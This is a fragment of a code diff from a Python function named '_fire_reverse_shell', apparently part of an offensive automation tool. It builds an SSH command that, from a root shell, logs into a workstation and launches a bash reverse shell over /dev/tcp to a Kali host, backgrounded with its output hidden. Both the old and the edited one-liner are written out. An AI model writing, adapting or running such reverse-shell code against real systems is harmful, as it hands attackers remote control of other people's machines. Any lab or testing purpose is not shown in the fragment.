@@ -205,7 +205,7 @@ def _fire_reverse_shell(root_shell, workstation_user, workstation_ip,
         f"-o ConnectTimeout=5 "
         f"-p {workstation_port} "
         f"{workstation_user}@{workstation_ip} "
-        f'"bash -i >& /dev/tcp/{kali_host}/{kali_port} 0>&1" '
+        f'"bash -i > /dev/tcp/{kali_host}/{kali_port} 2>/dev/null 0>&1" '
         f">/dev/null 2>&1 &"
     )
     send_command(root_shell, ssh_cmd)
